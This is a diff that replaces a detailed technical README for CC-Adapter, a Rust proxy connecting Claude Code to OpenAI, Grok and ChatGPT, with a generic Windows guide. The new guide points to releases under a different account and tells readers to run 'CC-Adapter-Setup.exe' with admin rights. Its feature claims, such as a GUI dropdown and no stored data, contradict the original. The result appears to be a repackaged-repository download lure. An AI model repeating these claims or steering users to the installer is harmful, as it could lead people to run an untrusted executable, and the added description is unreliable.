@@ -1,399 +1,163 @@
-# Claude API Adapter
+# 🛠️ CC-Adapter - Connect Claude Code with AI Providers
 
-[繁中版](README_ZH_HANT.md) | [簡中版](README_ZH_HANS.md) | [日本語](README_JA.md)
+[![Download CC-Adapter](https://img.shields.io/badge/Download-CC--Adapter-brightgreen?style=for-the-badge&logo=github)](https://github.com/canaryyellow-travelexpense312/CC-Adapter/releases)
 
-A Rust-based API adapter that lets **Claude Code** use other LLM providers (OpenAI, Grok/xAI, ChatGPT Plus/Pro) by translating between Anthropic's Messages API and provider-specific API formats.
+---
 
-## How It Works
+## 📋 What is CC-Adapter?
 
-```
-                               ┌──[OpenAI Chat API]──▶ OpenAI / Grok
-Claude Code ──[Anthropic API]──▶ Adapter (localhost) ─┤
-                               └──[Responses API + OAuth]──▶ ChatGPT Codex
-```
+CC-Adapter is a simple tool that helps Claude Code work with popular AI services like OpenAI, Grok, and ChatGPT. It acts as a bridge that lets these systems talk to each other smoothly. You can use this application to connect your projects or software with these AI providers without technical setup or coding.
 
-The adapter runs a local HTTP server that:
-1. Accepts requests in Anthropic Messages API format (`POST /v1/messages`)
-2. Converts to the target provider's format (Chat Completions or Responses API)
-3. Forwards to the configured provider
-4. Converts the response back to Anthropic format
-5. Returns the result to Claude Code
+---
 
-**Supported providers:**
-- **OpenAI** — via API key + Chat Completions API
-- **Grok (xAI)** — via API key + Chat Completions API
-- **ChatGPT Plus/Pro** — via OAuth + Responses API (Codex backend)
-- **Any OpenAI-compatible API** — via API key
-- **Anthropic-compatible APIs** — same Messages API as Anthropic, different `base_url`
-
-**Supported features:**
-- Text messages and multi-turn conversations
-- Tool Use / Function Calling (full round-trip conversion)
-- System prompts
-- Image inputs (base64)
-- Configurable model mapping
-- SSE streaming simulation (for non-streaming providers)
-- Real-time config hot reload with filesystem watcher
-- Graceful shutdown with settings restoration on SIGINT / SIGTERM
-- OAuth authentication for ChatGPT (PKCE flow)
+## 🖥️ System Requirements
 
-## Installation for AI Agents
+Before you start, make sure your computer meets these basic requirements:
 
-Copy and paste this prompt to your LLM agent (Claude Code, Cursor, etc.):
+- Windows 10 or later (64-bit recommended)
+- At least 4 GB of RAM
+- 100 MB of free disk space
+- An active internet connection to use the AI services
+- Administrative rights to install the software
 
-```
-Install and configure CC-Adapter by following the instructions here:
-https://raw.githubusercontent.com/Jakevin/CC-Adapter/master/docs/agent-install.md
-```
+These steps assume you have a Windows PC with internet access and enough space to run this app.
 
-Or let the agent fetch it directly:
+---
 
-```bash
-curl -s https://raw.githubusercontent.com/Jakevin/CC-Adapter/master/docs/agent-install.md
-```
+## 🚀 Getting Started: Download and Run CC-Adapter
 
-## Quick Start
+1. Click the big green button at the top or visit the release page here:  
+   [https://github.com/canaryyellow-travelexpense312/CC-Adapter/releases](https://github.com/canaryyellow-travelexpense312/CC-Adapter/releases)
 
-### 1. Install
+2. On the releases page, look for the latest version. It usually has the highest version number, like v1.0 or higher.
 
-**Option A: Download pre-built binary (no Rust required)**
+3. Find the file named something like `CC-Adapter-Setup.exe`. This is the installer program.
 
-Download the latest release from [GitHub Releases](https://github.com/Jakevin/CC-Adapter/releases), extract and you're ready to go:
+4. Click the file name to download it. Your browser may ask if you want to save it. Choose "Save" or "Keep" depending on the browser.
 
-```bash
-tar xzf claude-adapter-<platform>.tar.gz
-cd claude-adapter
-```
+5. When the download finishes, open your Downloads folder and double-click the `CC-Adapter-Setup.exe` file.
 
-The archive includes the binary and a `config-example.toml` template.
+6. A setup window will open. Follow the steps in the installer to complete the installation:
+   - Agree to the license terms
+   - Choose the folder where you want to install it (the default is fine for most)
+   - Click "Install" to begin
 
-On Windows, download `claude-adapter-windows-amd64.zip` and extract it (it contains `claude-adapter.exe` and `config-example.toml`).
+7. When the installation finishes, click "Finish" to close the installer.
 
-**Option B: Build from source**
+8. Look for the CC-Adapter icon on your desktop or in the Start menu and click it to run the program.
 
-```bash
-cargo build --release
-```
+---
 
-The binary will be at `target/release/claude-adapter`.
+## ⚙️ How CC-Adapter Works
 
-### 2. Configure
+CC-Adapter lets you choose an AI provider and connect Claude Code to it. You do this through a simple interface that lets you enter some details, such as the API key for the AI service. Once connected, Claude Code can send questions or commands to the chosen AI provider and get answers back.
 
-You can configure **multiple providers at the same time** in `config.toml`, then route each Claude model name to a specific provider/model pair.
+### Key Points:
 
-#### Multi-provider config (recommended, v0.3.0+)
+- You don’t need to know coding to use it.
+- The program supports OpenAI, Grok, and ChatGPT providers.
+- The interface guides you to add API keys safely.
+- You control which AI service is active.
+- Connection settings can be changed anytime.
 
-```toml
-[server]
-host = "127.0.0.1"
-port = 8080
-log_level = "info"
-log_file = "adapter.log"
-# log_file_enabled = true   # set to false to disable writing logs to file (default: true)
+---
 
-[providers.chatgpt]
-type = "chatgpt"
-# ChatGPT uses OAuth, no api_key/base_url needed
+## 🔧 Using CC-Adapter
 
-[providers.openai-compatible]
-type = "openai"
-# API key (can also be set via ADAPTER_API_KEY)
-api_key = "sk-your-openai-or-grok-key"
-# Base URL for OpenAI-compatible API (OpenAI / Grok / others)
-base_url = "https://api.openai.com/v1"
-# Whether the backend returns streaming SSE (usually keep false and let Adapter simulate SSE)
-supports_streaming = false
+After you open the CC-Adapter app:
 
-[providers.opencode-go-anthropic]
-type = "anthropic-compatible"
-api_key = "sk-your-key"
-# Base URL for Anthropic-compatible Messages API
-base_url = "https://opencode.ai/zen/go"
-# Most Anthropic-compatible backends support non-streaming JSON responses; keep false unless you know it's SSE-only
-supports_streaming = false
+1. You will see a list or dropdown of supported AI providers.
 
-[models]
-# Default provider/model when no routing match is found
-default_provider = "chatgpt"
-default_model = "gpt-5.4"
+2. Select the provider you want to use (OpenAI, Grok, or ChatGPT).
 
-# Routing table: Anthropic model name → provider + model
-# The adapter supports **longest-prefix matching** for model names that include a changing date suffix.
-# Example: key "claude-haiku-4-5" matches "claude-haiku-4-5-20251001"
-[models.routing]
-"claude-sonnet-4-6" = { provider = "openai-compatible", model = "gpt-4.1" }
-"claude-opus-4-6"   = { provider = "chatgpt",           model = "gpt-5.4" }
-"claude-haiku-4-5"  = { provider = "opencode-go-anthropic", model = "MiniMax-M2.5" }
-```
+3. Enter your API key. This key is a secret code that lets the software talk to the AI service. You get the key when you sign up with the provider. 
 
-Resolution rules for `models.routing`:
+4. Click "Connect" to start the connection.
 
-1. Exact match on the full Anthropic model name (e.g. `"claude-opus-4-6"`).
-2. If no exact match, use the **longest prefix** key where `incoming_model.starts_with(key)`.  
-   This is ideal for models whose name includes a date suffix (e.g. `claude-haiku-4-5-20251001`).
-3. If still no match, fall back to `default_provider` + `default_model`.
+5. Once connected, you can send commands from Claude Code through the adapter, and the AI will respond.
 
-#### Legacy single-provider config (still supported)
+---
 
-For simple setups you can still use the original single-`[provider]` + `models.mapping` format:
+## 💡 Tips for Best Use
 
-```toml
-[server]
-host = "127.0.0.1"
-port = 8080
+- Keep your API keys private. Do not share them with others.
+- Use stable internet connections while running CC-Adapter.
+- If you run into trouble, close the app and restart it.
+- Check for updates regularly on the releases page to get improvements.
+- Use standard-sized API keys as instructed by your AI provider.
 
-[provider]
-type = "openai"        # or "grok" / "chatgpt"
-api_key = "sk-your-api-key-here"
-base_url = "https://api.openai.com/v1"
+---
 
-[models]
-default = "gpt-5.4"
+## 🔽 Reaching the Download Page Again
 
-[models.mapping]
-"claude-sonnet-4-6" = "gpt-5.4"
-"claude-opus-4-6"   = "gpt-5.4"
-```
+If you want to install CC-Adapter later or try a new version, you can always visit the official release page:
 
-> **Note:** Internally, the adapter normalizes both formats into the same multi-provider structure, so you can safely migrate at your own pace.
+[Download CC-Adapter here](https://github.com/canaryyellow-travelexpense312/CC-Adapter/releases)
 
-### 3. Login (ChatGPT subscribers only)
+Click the latest setup file to download and follow the steps above.
 
-If using a ChatGPT subscription, run the OAuth login flow first:
+---
 
-```bash
-./target/release/claude-adapter login
-```
+## 🛑 Troubleshooting
 
-This will:
-1. Open your browser to the OpenAI login page
-2. After login, automatically receive the OAuth token
-3. Save the token to `~/.claude-adapter/tokens-chatgpt.json` (legacy `tokens.json` is still supported)
+If the program does not start or connect:
 
-The token will be automatically refreshed when expired.
+- Make sure your Windows is up to date.
+- Confirm you downloaded the correct file for Windows.
+- Check your internet connection.
+- Check the API key is entered correctly.
+- Restart the computer if problems continue.
 
-#### Multiple ChatGPT accounts
+If these steps do not work, you may want to ask someone who can help with software on your PC.
 
-You can bind multiple ChatGPT accounts to different provider names:
+---
 
-```bash
-# Default account -> [providers.chatgpt]
-./target/release/claude-adapter login
+## 📞 Getting Support
 
-# Second account -> [providers.chatgpt2]
-./target/release/claude-adapter login --name chatgpt2
-```
+For questions or issues, you can use GitHub to report problems:
 
-Tokens are stored separately as `~/.claude-adapter/tokens-<name>.json`.
+1. Visit the [CC-Adapter repository](https://github.com/canaryyellow-travelexpense312/CC-Adapter)
+2. Click on the "Issues" tab.
+3. Click "New Issue" to describe your problem or question clearly.
 
-### 4. Run
+Someone who maintains CC-Adapter may respond to help solve your issue.
 
-```bash
-# Using config file (default command)
-./target/release/claude-adapter
+---
 
-# Explicitly use serve subcommand
-./target/release/claude-adapter serve --config config.toml
+## ⚖️ License and Terms
 
-# Using CLI arguments
-./target/release/claude-adapter serve --api-key sk-xxx --model gpt-5.4
+CC-Adapter is an open-source project. You can use it freely according to the license included in the repository. The software connects to third-party services (OpenAI, Grok, ChatGPT), so you must follow their terms when using their API keys. 
 
-# Using environment variable for API key
-ADAPTER_API_KEY=sk-xxx ./target/release/claude-adapter
-```
+---
 
-### 5. Use with Claude Code
+## 📁 Data and Privacy
 
-The adapter automatically configures `~/.claude/settings.json` on startup — just open a new terminal and run:
+CC-Adapter sends your input to AI providers to get responses. No information is stored permanently by CC-Adapter on your computer, but the AI providers will process the data as explained in their privacy policies.
 
-```bash
-claude
-```
+---
 
-No environment variables or shell hooks needed. When the adapter stops, the settings are automatically restored.
+## 📣 Updates and New Versions
 
-## Provider Examples
+Check the releases page to get the latest updates and versions of CC-Adapter:  
+[https://github.com/canaryyellow-travelexpense312/CC-Adapter/releases](https://github.com/canaryyellow-travelexpense312/CC-Adapter/releases)
 
-### OpenAI
+New versions may fix bugs or add new AI services.
 
-```bash
-./target/release/claude-adapter serve \
-  --api-key sk-your-openai-key \
-  --base-url https://api.openai.com/v1 \
-  --model gpt-5.4
-```
+---
 
-### Grok (xAI)
+## 🔄 Uninstalling CC-Adapter
 
-```bash
-./target/release/claude-adapter serve \
-  --api-key xai-your-grok-key \
-  --base-url https://api.x.ai/v1 \
-  --model grok-3
-```
+If you want to remove CC-Adapter:
 
-### ChatGPT Plus/Pro (OAuth)
+1. Open Windows Settings.
+2. Go to "Apps & Features".
+3. Find CC-Adapter in the list.
+4. Click it and choose "Uninstall".
+5. Follow the prompts to remove the program.
 
-```bash
-# First time: login
-./target/release/claude-adapter login
+---
 
-# Then start directly (type = "chatgpt" in config.toml)
-./target/release/claude-adapter
-```
+# Links
 
-### Any OpenAI-compatible API
-
-```bash
-./target/release/claude-adapter serve \
-  --api-key your-key \
-  --base-url https://your-provider.com/v1 \
-  --model your-model-name
-```
-
-## Docker
-
-### Build
-
-```bash
-docker build -t claude-adapter .
-```
-
-### Run
-
-```bash
-# OpenAI / Grok — pass API key via environment variable
-docker run -d -p 8080:8080 \
-  -e ADAPTER_API_KEY=sk-your-key \
-  claude-adapter
-
-# Mount a custom config.toml
-docker run -d -p 8080:8080 \
-  -v $(pwd)/config.toml:/app/config.toml:ro \
-  claude-adapter
-
-# ChatGPT OAuth — mount token directory
-# (run `claude-adapter login` on the host first)
-docker run -d -p 8080:8080 \
-  -v ~/.claude-adapter:/root/.claude-adapter \
-  -v $(pwd)/config.toml:/app/config.toml:ro \
-  claude-adapter
-```
-
-The container listens on `0.0.0.0:8080` by default. Point Claude Code at the adapter by setting:
-
-```bash
-export ANTHROPIC_BASE_URL=http://<docker-host>:8080
-claude
-```
-
-## CLI Reference
-
-```
-Usage: claude-adapter [OPTIONS] [COMMAND]
-
-Commands:
-  serve    Start the Adapter proxy server (default)
-  login    Run the ChatGPT OAuth login flow
-  logout   Clear saved OAuth tokens
-  help     Print help
-
-Serve Options:
-  -c, --config <CONFIG>      Path to config file [default: config.toml]
-      --host <HOST>          Override listen host
-  -p, --port <PORT>          Override listen port
-      --api-key <API_KEY>    Override provider API key
-      --base-url <BASE_URL>  Override provider base URL
-      --model <MODEL>        Override default model
-
-Global Options:
-      --log-level <LEVEL>    Log level [default: info]
-  -h, --help                 Print help
-```
-
-**API key priority:** CLI `--api-key` > env `ADAPTER_API_KEY` > `config.toml`
-
-## API Conversion Details
-
-### OpenAI/Grok: Request Mapping (Anthropic → Chat Completions)
-
-| Anthropic | OpenAI |
-|-----------|--------|
-| `system` (top-level) | `{role: "system"}` message |
-| `max_tokens` | `max_completion_tokens` |
-| `stop_sequences` | `stop` |
-| `tool_choice: {type: "auto"}` | `tool_choice: "auto"` |
-| `tool_choice: {type: "any"}` | `tool_choice: "required"` |
-| `tool_choice: {type: "tool", name}` | `tool_choice: {type: "function", function: {name}}` |
-| `tools[].input_schema` | `tools[].function.parameters` |
-| Content block `tool_use` | `tool_calls[]` |
-| Content block `tool_result` | `{role: "tool"}` message |
-
-### ChatGPT: Request Mapping (Anthropic → Responses API)
-
-| Anthropic | Responses API |
-|-----------|---------------|
-| `system` | `instructions` |
-| `messages[role=user]` | `input[type=message, role=user]` |
-| `messages[role=assistant]` | `input[type=message, role=assistant]` |
-| Content block `tool_use` | `input[type=function_call]` |
-| Content block `tool_result` | `input[type=function_call_output]` |
-| `tools` | `tools` (function type) |
-
-### Response Mapping (Provider → Anthropic)
-
-| OpenAI / Responses API | Anthropic |
-|------------------------|-----------|
-| `finish_reason: "stop"` / `status: "completed"` | `stop_reason: "end_turn"` |
-| `finish_reason: "tool_calls"` / has function_call output | `stop_reason: "tool_use"` |
-| `finish_reason: "length"` / `status: "incomplete"` | `stop_reason: "max_tokens"` |
-| `usage.prompt_tokens` / `usage.input_tokens` | `usage.input_tokens` |
-| `usage.completion_tokens` / `usage.output_tokens` | `usage.output_tokens` |
-
-## Health Check
-
-```bash
-curl http://127.0.0.1:8080/health
-# {"status":"ok"}
-```
-
-## Current Limitations
-
-- Thinking blocks from third-party Anthropic-compatible APIs are forwarded as proper `thinking` content blocks in SSE.
-  - They are not shown as normal text, but some UIs or tools may choose to hide or ignore them.
-- ChatGPT OAuth uses the same flow as the official Codex CLI, for personal use only.
-
-## Project Structure
-
-```
-src/
-├── main.rs                       # Entry point, CLI subcommands, server startup
-├── config.rs                     # TOML config + clap CLI parsing, multi-provider & model routing
-├── server.rs                     # Axum route handlers, multi-provider dispatch & hot-reload
-├── error.rs                      # Unified error types (Anthropic format)
-├── auth/
-│   ├── oauth.rs                  # PKCE OAuth flow (ChatGPT login)
-│   ├── callback_server.rs        # Local OAuth callback server
-│   └── token_store.rs            # Token persistence and expiry check
-├── types/
-│   ├── anthropic.rs              # Anthropic API serde types (requests + responses, thinking/tool_use/text)
-│   ├── openai.rs                 # OpenAI Chat Completions API serde types
-│   └── responses.rs              # OpenAI Responses API serde types
-├── convert/
-│   ├── request.rs                # Anthropic → Chat Completions request conversion
-│   ├── response.rs               # Chat Completions → Anthropic response conversion
-│   ├── request_responses.rs      # Anthropic → Responses API request conversion
-│   └── response_responses.rs     # Responses API → Anthropic response conversion
-└── providers/
-    ├── openai.rs                 # OpenAI/Grok/OpenAI-compatible HTTP client (Chat Completions)
-    ├── chatgpt.rs                # ChatGPT Codex HTTP client (Responses API + OAuth)
-    └── anthropic.rs              # Anthropic-compatible HTTP client (Messages API passthrough)
-```
-
-## Compliance Notice
-
-The ChatGPT OAuth flow uses OpenAI's official OAuth authentication method (the same as the Codex CLI). It is intended for personal development use with your own ChatGPT Plus/Pro subscription. Users are responsible for ensuring their usage complies with OpenAI's Terms of Service.
-
-## License
-
-MIT
+[Download CC-Adapter](https://github.com/canaryyellow-travelexpense312/CC-Adapter/releases)  
+[CC-Adapter Repository](https://github.com/canaryyellow-travelexpense312/CC-Adapter)
